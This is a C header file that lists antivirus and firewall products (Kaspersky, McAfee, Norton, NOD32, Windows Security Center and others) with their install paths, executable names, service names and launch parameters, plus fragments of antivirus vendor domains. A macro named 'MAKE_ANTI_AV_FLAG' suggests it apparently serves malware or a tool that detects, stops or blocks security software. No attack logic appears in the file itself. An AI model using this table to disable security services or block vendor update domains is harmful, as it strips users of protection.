#ifndef __HEUR_AV__H
#define __HEUR_AV__H

#define MAKE_ANTI_AV_FLAG(av_id) (1<<(av_id))

enum eAntiVirusId {
	avKaspersky,
	avSymantec,
	avFSecure,
	avMcAfee,
	avNOD32,
	avSophos,
	avNAI,
	avTrendMicro,
	avRising,
	avKingSoft,
	avOutpost,
	avZoneLabs,
	avSygate,
	avMicrosoft,
	avAVIRA,
	avLuoSoft,
	avKV,
	av360Safe
};

enum ePathLocation {
	flWindows,
	flSystem32,
	flProgramFiles,
};

const tcstring arrPathLocations[] = {
	_T("C:\\WINDOWS"),
	_T("C:\\WINDOWS\\System32"),
	_T("C:\\Program Files"),
};

typedef struct tag_AV_DESCR {
	eAntiVirusId  id;
	ePathLocation path_location;
	tcstring      file_path;
	tcstring      file_name;
	tcstring      service_name;
	tcstring      parameters;
} AV_DESCR;

const AV_DESCR arrAntiViruses[] = 
{
	{ avKaspersky,   flProgramFiles, _T("Kaspersky Lab\\Kaspersky Anti-Virus Personal"), _T("Avpcc.exe"), _T("avpcc")},
	{ avKaspersky,   flProgramFiles, _T("Kaspersky Lab\\Kaspersky Anti-Virus Personal"), _T("Avpm.exe"), _T("KAVMonitorService")}, 
	{ avKaspersky,   flProgramFiles, _T("Kaspersky Lab\\Kaspersky Anti-Virus Personal"), _T("kavsvc.exe"), _T("kavsvc")}, 
	{ avKaspersky,   flProgramFiles, _T("Kaspersky Lab\\Kaspersky Anti-Virus Personal Pro 5"), _T("kavmm.exe"), _T("KLBLMain"), _T("-run -n PersonalPro -v 5.0.0.0")}, 
	{ avKaspersky,   flProgramFiles, _T("Kaspersky Lab\\Kaspersky Anti-Virus Personal"), _T("Avp32.exe") },
	{ avKaspersky,   flProgramFiles, _T("Kaspersky Lab\\Kaspersky Internet Security 6.0"), _T("avp.exe"), _T("AVP") },
	{ avKaspersky,   flProgramFiles, _T("Common Files\\KAV Shared Files"), _T("Avpupd.exe") },
	 
	{ avMcAfee,      flProgramFiles, _T("McAfee\\McAfee Firewall"), _T("cpd.exe"), _T("McAfee Firewall"), _T("/SERVICE") }, 
	{ avMcAfee,      flProgramFiles, _T("Network Associates\\Common Framework"), _T("FrameworkService.exe"), _T("McAfeeFramework"), _T("/ServiceStart")}, 
	{ avMcAfee,      flProgramFiles, _T("mcafee.com\\vso"), _T("mcshield.exe"), _T("McShield") }, 
	{ avMcAfee,      flProgramFiles, _T("mcafee.com\\vso"), _T("Mcvsshld.exe") }, 
	{ avMcAfee,      flProgramFiles, _T("mcafee.com\\vso"), _T("mcvsftsn.exe") }, 
	{ avMcAfee,      flProgramFiles, _T("mcafee.com\\vso"), _T("mcvsescn.exe") }, 
	

	{ avMcAfee,      flProgramFiles, _T("mcafee.com\\personal firewall"), _T("MPFService.exe"), _T("MpfService") }, // McAfee Personal Firewall Service 

	{ avSymantec,    flProgramFiles, _T("Norton AntiVirus"), _T("navapsvc.exe"), _T("navapsvc") }, 
	{ avSymantec,    flProgramFiles, _T("Norton AntiVirus"), _T("Navw32.exe") }, 
	{ avSymantec,    flProgramFiles, _T("Norton AntiVirus"), _T("Navrunr.exe") }, 
	{ avSymantec,    flProgramFiles, _T("Norton Internet Security"), _T("NISSERV.EXE"), _T("NISSERV") }, 
	{ avSymantec,    flProgramFiles, _T("Symantec AntiVirus"), _T("Rtvscan.exe"), _T("Symantec AntiVirus Client") }, 
	{ avSymantec,    flProgramFiles, _T("Common Files\\Symantec Shared\\CCPD-LC"), _T("symlcsvc.exe"), _T("Symantec Core LC") }, 
	{ avSymantec,    flProgramFiles, _T("Norton Internet Security\\Norton AntiVirus"), _T("Navwnt.exe") }, 
	{ avSymantec,    flProgramFiles, _T("Norton Internet Security\\Norton AntiVirus"), _T("SAVScan.exe"), _T("SAVScan") }, 
	
	{ avNOD32,       flSystem32, 0, _T("nod32m2.exe"), _T("NOD32Service") }, 
	{ avNOD32,       flSystem32, 0, _T("nod32cc.exe"), _T("NOD32ControlCenter"), _T("-service") },  
	{ avNOD32,       flProgramFiles, _T("Eset"), _T("nod32krn.exe"), _T("NOD32krn")},  
	{ avNOD32,       flProgramFiles, _T("Eset"), _T("nod32kui.exe"), 0, _T("/WAITSERVICE")},  
	
	{ avFSecure,     flProgramFiles, _T("F-Secure Internet Security\\backweb\\4476822\\program"), _T("fsbwsys.exe"), _T("fsbwsys") },  
	{ avFSecure,     flProgramFiles, _T("F-Secure Internet Security\\FWES\\Program"), _T("fsdfwd.exe"), _T("fsdfwd") },  
	{ avFSecure,     flProgramFiles, _T("F-Secure\\Anti-Virus"), _T("fsav32.exe") },  
	{ avFSecure,     flProgramFiles, _T("F-Secure\\Anti-Virus"), _T("Fsgk32.exe") },  

	{ avOutpost,     flProgramFiles, _T("Agnitum\\Outpost Firewall"), _T("outpost.exe"), _T("OutpostFirewall")},
	{ avOutpost,     flProgramFiles, _T("Agnitum\\Outpost Firewall"), _T("outpost.exe"), 0, _T("/waitservice")},

	{ avRising,      flProgramFiles, _T("Rising\\Rav"), _T("RavMon.exe") },
	{ avRising,      flProgramFiles, _T("Rising\\Rav"), _T("RavMonD.exe"), _T("RsRavMon") }, // Rising RealTime Monitor 
	{ avRising,      flProgramFiles, _T("Rising\\Rav"), _T("CCenter.exe"), _T("RsCCenter") }, // Rising Process Communication Center 
	{ avRising,      flProgramFiles, _T("Rising\\rfw"), _T("rfwsrv.exe"), _T("RfwService") }, // Rising Personal Firewall Service

	{ avKingSoft,    flProgramFiles, _T("KAV6"), _T("MailMon.EXE") },  
	{ avKingSoft,    flProgramFiles, _T("KAV6"), _T("KWatchUI.EXE") },  
	{ avKingSoft,    flProgramFiles, _T("KAV6"), _T("KAVSvc.EXE"), _T("Kingsoft AntiVirus Service") },  
	{ avKingSoft,    flProgramFiles, _T("KAV6"), _T("KavPFW.exe") },  // KingSoft Personal Firewall Launcher

	{ avZoneLabs,    flSystem32, _T("ZoneLabs"), _T("vsmon.exe"), _T("vsmon") },  // TrueVector Internet Monitor 
	{ avZoneLabs,    flProgramFiles, _T("Zone Labs\\ZoneAlarm"), _T("zonealarm.exe") },

	{ avSygate,      flProgramFiles, _T("Sygate\\SPF"), _T("smc.exe"), _T("SmcService") },  // Sygate Personal Firewall 

	{ avMicrosoft,   flSystem32, 0, _T("svchost.exe"), _T("wscsvc") },  // Security Center
	{ avMicrosoft,   flSystem32, 0, _T("svchost.exe"), _T("SharedAccess") },  // Windows Firewall/Internet Connection Sharing (ICS)

	{ avAVIRA,       flProgramFiles, _T("AntiVir PersonalEdition Classic"), _T("sched.exe"), _T("AntiVirScheduler") },  // AntiVir Scheduler
	{ avAVIRA,       flProgramFiles, _T("AntiVir PersonalEdition Classic"), _T("avguard.exe"), _T("AntiVirService") },  // AntiVir PersonalEdition Classic Service 
	{ avAVIRA,       flProgramFiles, _T("AntiVir PersonalEdition Classic"), _T("avcenter.exe") },
	{ avAVIRA,       flProgramFiles, _T("AntiVir PersonalEdition Classic"), _T("avgnt.exe"), 0, _T("/min") },

	{ avLuoSoft,     flProgramFiles, _T("Iparmor"), _T("Iparmor.exe") },  // Chinese Anti Trojan

	{ avKV,          flProgramFiles, _T("KV2006"),  _T("kregex.exe") },  // another Chinese AV
	{ avKV,          flProgramFiles, _T("KV2006"),  _T("kvxp.kxp") },

	{ av360Safe,     flProgramFiles, _T("360safe\\safemon"), _T("360tray.exe") },  // another Chinese AV
};

typedef struct tag_AV_DESCR_A {
	eAntiVirusId id;
	const char*  name;
} AV_DESCR_A;

const AV_DESCR_A arrAntiVirusDomains[] = 
{
	{ avKaspersky,   ".avp." }, 
	{ avKaspersky,   ".kaspersky." },
	{ avKaspersky,   ".kaspersky-labs." }, 
	{ avMcAfee,      ".mcafee." }, 
	{ avFSecure,     ".f-secure." },  
	{ avSophos,      ".sophos." },  
	{ avNAI,         ".nai." },  
	{ avSymantec,    ".symantec." }, 
	{ avTrendMicro,  ".trendmicro." },  
};


#endif // __HEUR_AV__H



